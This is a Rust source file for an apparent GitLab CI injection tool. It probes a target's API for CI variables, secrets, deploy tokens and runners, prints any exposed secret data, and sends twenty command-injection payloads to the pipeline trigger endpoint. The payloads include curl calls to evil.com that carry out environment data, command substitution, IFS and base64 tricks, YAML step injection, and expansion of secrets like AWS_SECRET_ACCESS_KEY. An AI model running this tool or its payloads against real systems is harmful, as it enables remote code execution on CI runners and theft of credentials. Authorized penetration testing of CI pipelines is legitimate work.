use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::HeaderName::from_static("private-token"),
            reqwest::header::HeaderValue::from_str(t).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const GITLABCI_ENDPOINTS: &[(&str, &str)] = &[
    ("Projects", "/api/v4/projects"),
    ("Pipelines", "/api/v4/projects/{id}/pipelines"),
    ("Jobs", "/api/v4/projects/{id}/jobs"),
    ("Job trace", "/api/v4/projects/{id}/jobs/{job_id}/trace"),
    ("Variables", "/api/v4/projects/{id}/variables"),
    ("Group variables", "/api/v4/groups/{group_id}/variables"),
    ("Runners", "/api/v4/runners"),
    ("Project runners", "/api/v4/projects/{id}/runners"),
    ("Runner jobs", "/api/v4/runners/{runner_id}/jobs"),
    ("Triggers", "/api/v4/projects/{id}/triggers"),
    ("Trigger token", "/api/v4/projects/{id}/triggers/{token_id}"),
    ("Environments", "/api/v4/projects/{id}/environments"),
    ("Deploy tokens", "/api/v4/projects/{id}/deploy_tokens"),
    ("Secrets", "/api/v4/projects/{id}/secrets"),
    ("CI/CD settings", "/api/v4/projects/{id}/ci_cd_settings"),
];

const GITLABCI_INJECTION_VECTORS: &[(&str, &str, &str)] = &[
    ("MR title — command substitution", "$(whoami)", "merge_request"),
    ("MR title — backticks", "`id`", "merge_request"),
    ("MR description — env exfil", "$(curl https://evil.com/?d=$(env))", "merge_request"),
    ("MR description — secret exfil", "$(cat $CI_PROJECT_DIR/.gitlab-ci.yml)", "merge_request"),
    ("Commit message — command substitution", "$(printenv)", "push"),
    ("Commit message — backticks", "`whoami`", "push"),
    ("Branch name — command substitution", "$(curl https://evil.com/$(whoami))", "push"),
    ("Branch name — IFS bypass", "test${IFS}&&${IFS}id", "push"),
    ("Tag name — command substitution", "v1.0$(whoami)", "tag"),
    ("Tag message — env exfil", "release$(env | grep CI_)", "tag"),
    ("Variable value — RCE", "$(curl https://evil.com)", "variable"),
    ("Variable key — injection", "CI_IMAGE;curl https://evil.com", "variable"),
    ("Pipeline schedule — cron inject", "* * * * * $(whoami)", "schedule"),
    ("Pipeline schedule — command", "0 2 * * * curl https://evil.com", "schedule"),
    ("MR title — $variable expansion", "$CI_REGISTRY_PASSWORD", "merge_request"),
    ("MR description — ${variable}", "${CI_DEPLOY_PASSWORD}", "merge_request"),
    ("Commit message — $variable", "$CI_SERVER_TOKEN", "push"),
    ("Branch name — ${variable}", "${AWS_SECRET_ACCESS_KEY}", "push"),
    ("MR title — base64 exec", "$(echo d2hvYW1p | base64 -d)", "merge_request"),
    ("Commit message — newline + run", "test\n  script:\n    - curl https://evil.com", "push"),
];

pub async fn inject(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} GitLab CI Injection Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} injection vectors, {} API endpoints", "[*]".cyan().bold(), GITLABCI_INJECTION_VECTORS.len(), GITLABCI_ENDPOINTS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/2] GitLab CI API enumeration...", "[*]".cyan().bold());
    let mut found = Vec::new();
    for (name, path) in GITLABCI_ENDPOINTS {
        let clean_path = path.replace("{id}", "1").replace("{group_id}", "1").replace("{job_id}", "1").replace("{runner_id}", "1").replace("{token_id}", "1");
        let full_url = format!("{}{}", base, clean_path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200;
                let has_vars = body.contains("variable") || body.contains("CI_");
                let has_runners = body.contains("runner") || body.contains("shared");
                let has_secrets = body.contains("secret") || body.contains("token") || body.contains("password");
                let tag = if accessible {
                    if has_secrets { "SECRETS".red().bold().to_string() }
                    else if has_vars { "VARIABLES".red().bold().to_string() }
                    else if has_runners { "RUNNERS".red().bold().to_string() }
                    else { "accessible".green().to_string() }
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accessible {
                    found.push(*name);
                    if has_secrets || has_vars {
                        println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
                    }
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!("\n{} [2/2] CI injection payloads...", "[*]".cyan().bold());
    println!("  {} Testing {} injection vectors...", "*".cyan(), GITLABCI_INJECTION_VECTORS.len());
    let mut results = Vec::new();

    for (name, payload, trigger) in GITLABCI_INJECTION_VECTORS {
        let trigger_url = format!("{}/api/v4/projects/1/trigger/pipeline", base);
        let body = serde_json::json!({
            "ref": "main",
            "variables": [
                {"key": "INJECTION_TEST", "value": payload},
                {"key": "TRIGGER_TYPE", "value": trigger},
            ],
        });

        match client.post(&trigger_url)
            .header("Content-Type", "application/json")
            .body(body.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let triggered = status == 201 || status == 200;
                let has_error = resp_body.contains("error") || resp_body.contains("invalid");
                let tag = if triggered {
                    "TRIGGERED".red().bold().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else if has_error {
                    "rejected".green().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} [{:02}] {:40} trigger={:15} {}", "*".cyan(), results.len() + 1, name, trigger, tag);
                if triggered {
                    results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:40} error", "*".red(), results.len() + 1, name);
            }
        }
    }

    println!(
        "\n{} {} API endpoints accessible, {} / {} injection vectors triggered",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        GITLABCI_INJECTION_VECTORS.len()
    );

    let has_vars = found.iter().any(|n| n.contains("Variable"));
    let has_runners = found.iter().any(|n| n.contains("runner") || n.contains("Runner"));
    let has_secrets = found.iter().any(|n| n.contains("Secret") || n.contains("Trigger") || n.contains("Deploy"));
    if has_secrets {
        println!("{} [CRITICAL] Secrets/tokens accessible — credential extraction!", "[!]".red().bold());
    }
    if has_vars {
        println!("{} [HIGH] CI variables accessible — secret exfiltration!", "[!]".red().bold());
    }
    if has_runners {
        println!("{} [HIGH] Runners accessible — runner abuse possible!", "[!]".red().bold());
    }
    if !results.is_empty() {
        let has_cmd = results.iter().any(|n| n.contains("command") || n.contains("backtick") || n.contains("IFS") || n.contains("base64"));
        let has_var_exp = results.iter().any(|n| n.contains("variable") || n.contains("$"));
        let has_yaml = results.iter().any(|n| n.contains("newline") || n.contains("YAML"));
        if has_cmd {
            println!("{} [CRITICAL] Command substitution injection — RCE on runner!", "[!]".red().bold());
        }
        if has_var_exp {
            println!("{} [CRITICAL] Variable expansion injection — CI secret exfiltration!", "[!]".red().bold());
        }
        if has_yaml {
            println!("{} [HIGH] YAML injection — pipeline config modification!", "[!]".red().bold());
        }
    }

    Ok(())
}
